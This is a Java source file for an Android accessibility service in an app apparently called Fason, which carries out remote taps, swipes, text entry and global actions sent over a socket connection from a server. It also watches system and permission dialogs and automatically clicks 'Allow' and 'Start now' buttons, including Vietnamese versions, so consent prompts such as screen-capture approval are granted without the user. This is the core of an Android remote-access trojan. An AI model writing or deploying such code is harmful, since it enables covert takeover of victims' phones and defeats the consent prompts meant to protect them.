package com.fason.app.features.screen;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.graphics.Path;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.content.SharedPreferences;

import java.util.List;

import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;

import org.json.JSONObject;

import io.socket.client.Socket;

/**
 * Accessibility Service for remote screen control.
 * Receives commands from the server to perform:
 * - Tap at coordinates
 * - Swipe gestures
 * - Global actions (back, home, recents)
 * - Text input
 *
 * Must be enabled manually by the user in Settings > Accessibility.
 */
public class ScreenControlService extends AccessibilityService {

    private static ScreenControlService instance;

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        
        try {
            SharedPreferences prefs = getSharedPreferences("fason_prefs", Context.MODE_PRIVATE);
            if (prefs.getBoolean("screen_capture_approved", false)) {
                String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
                if (pkg.contains("systemui") || pkg.contains("permission")) {
                    AccessibilityNodeInfo root = getRootInActiveWindow();
                    if (root != null) {
                        autoClickByText(root, "Start now");
                        autoClickByText(root, "Bắt đầu ngay");
                        autoClickByText(root, "Bắt đầu");
                        autoClickByText(root, "Allow");
                        autoClickByText(root, "Cho phép");
                        root.recycle();
                    }
                }
            }
        } catch (Exception ignored) {}
    }

    private void autoClickByText(AccessibilityNodeInfo node, String text) {
        if (node == null) return;
        List<AccessibilityNodeInfo> list = node.findAccessibilityNodeInfosByText(text);
        if (list != null) {
            for (AccessibilityNodeInfo n : list) {
                if (n.isClickable() && n.getText() != null && n.getText().toString().equalsIgnoreCase(text)) {
                    n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }
                n.recycle();
            }
        }
    }

    @Override
    public void onInterrupt() {
        // Required override
    }

    @Override
    public void onDestroy() {
        instance = null;
        super.onDestroy();
    }

    public static ScreenControlService getInstance() {
        return instance;
    }

    /**
     * Check if the accessibility service is enabled in system settings.
     */
    public static boolean isEnabled() {
        try {
            Context ctx = FasonApp.getContext();
            String serviceId = ctx.getPackageName() + "/" + ScreenControlService.class.getName();
            String enabledServices = Settings.Secure.getString(
                    ctx.getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            );
            if (TextUtils.isEmpty(enabledServices)) return false;
            String[] services = enabledServices.split(":");
            for (String s : services) {
                if (s.trim().equals(serviceId)) return true;
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * Perform a tap gesture at the given screen coordinates.
     */
    public void performTap(float x, float y) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;

        try {
            Path path = new Path();
            path.moveTo(x, y);

            GestureDescription.StrokeDescription stroke =
                    new GestureDescription.StrokeDescription(path, 0, 100);

            GestureDescription gesture = new GestureDescription.Builder()
                    .addStroke(stroke)
                    .build();

            dispatchGesture(gesture, null, null);
        } catch (Exception ignored) {}
    }

    /**
     * Perform a swipe gesture between two points.
     */
    public void performSwipe(float fromX, float fromY, float toX, float toY, long duration) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;

        try {
            Path path = new Path();
            path.moveTo(fromX, fromY);
            path.lineTo(toX, toY);

            long swipeDuration = Math.max(100, Math.min(duration, 2000));

            GestureDescription.StrokeDescription stroke =
                    new GestureDescription.StrokeDescription(path, 0, swipeDuration);

            GestureDescription gesture = new GestureDescription.Builder()
                    .addStroke(stroke)
                    .build();

            dispatchGesture(gesture, null, null);
        } catch (Exception ignored) {}
    }

    /**
     * Perform a global action (back, home, recents, etc.)
     */
    public void performKey(String keyCode) {
        try {
            switch (keyCode) {
                case "back":
                    performGlobalAction(GLOBAL_ACTION_BACK);
                    break;
                case "home":
                    performGlobalAction(GLOBAL_ACTION_HOME);
                    break;
                case "recents":
                    performGlobalAction(GLOBAL_ACTION_RECENTS);
                    break;
                case "power":
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
                    }
                    break;
                case "notifications":
                    performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS);
                    break;
                case "quick_settings":
                    performGlobalAction(GLOBAL_ACTION_QUICK_SETTINGS);
                    break;
            }
        } catch (Exception ignored) {}
    }

    /**
     * Input text by setting clipboard and pasting.
     */
    public void performTextInput(String text) {
        try {
            android.content.ClipboardManager clipboard =
                    (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (clipboard != null) {
                clipboard.setPrimaryClip(
                        android.content.ClipData.newPlainText("text", text)
                );
            }

            boolean didSetText = false;
            android.view.accessibility.AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                android.view.accessibility.AccessibilityNodeInfo focused = root.findFocus(
                        android.view.accessibility.AccessibilityNodeInfo.FOCUS_INPUT
                );
                if (focused != null) {
                    Bundle args = new Bundle();
                    args.putCharSequence(
                            android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                            text
                    );
                    didSetText = focused.performAction(
                            android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT,
                            args
                    );
                    focused.recycle();
                }
                root.recycle();
            }

            if (!didSetText && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                // GLOBAL_ACTION_PASTE (= 11) was introduced in API 30 (Android 11 / R).
                // Using literal value to avoid symbol-resolution issues with older build environments.
                performGlobalAction(11);
            }
        } catch (Exception ignored) {}
    }

    /**
     * Handle a screen control command from the server.
     */
    public static void handleCommand(JSONObject data) {
        ScreenControlService svc = getInstance();
        if (svc == null) {
            // Service not running - send error
            try {
                Socket socket = SocketClient.getInstance().getSocket();
                if (socket != null) {
                    JSONObject err = new JSONObject();
                    err.put(Protocol.KEY_ERROR, "Accessibility Service not enabled");
                    err.put(Protocol.KEY_ACCESSIBLE, false);
                    socket.emit(Protocol.SCREEN_CTRL, err);
                }
            } catch (Exception ignored) {}
            return;
        }

        try {
            String action = data.optString(Protocol.KEY_ACTION, "");
            switch (action) {
                case Protocol.ACT_TAP:
                    float tapX = (float) data.optDouble(Protocol.KEY_X, 0);
                    float tapY = (float) data.optDouble(Protocol.KEY_Y, 0);
                    svc.performTap(tapX, tapY);
                    break;

                case Protocol.ACT_SWIPE:
                    float fromX = (float) data.optDouble(Protocol.KEY_FROM_X, 0);
                    float fromY = (float) data.optDouble(Protocol.KEY_FROM_Y, 0);
                    float toX = (float) data.optDouble(Protocol.KEY_TO_X, 0);
                    float toY = (float) data.optDouble(Protocol.KEY_TO_Y, 0);
                    long dur = data.optLong(Protocol.KEY_DUR, 300);
                    svc.performSwipe(fromX, fromY, toX, toY, dur);
                    break;

                case Protocol.ACT_TEXT:
                    String text = data.optString(Protocol.KEY_TEXT, "");
                    if (!text.isEmpty()) {
                        svc.performTextInput(text);
                    }
                    break;

                case Protocol.ACT_KEY:
                    String keyCode = data.optString(Protocol.KEY_KEY_CODE, "");
                    if (!keyCode.isEmpty()) {
                        svc.performKey(keyCode);
                    }
                    break;

                case Protocol.ACT_STATUS:
                    try {
                        Socket socket = SocketClient.getInstance().getSocket();
                        if (socket != null) {
                            JSONObject status = new JSONObject();
                            status.put(Protocol.KEY_ACCESSIBLE, true);
                            socket.emit(Protocol.SCREEN_CTRL, status);
                        }
                    } catch (Exception ignored) {}
                    break;
            }
        } catch (Exception ignored) {}
    }
}
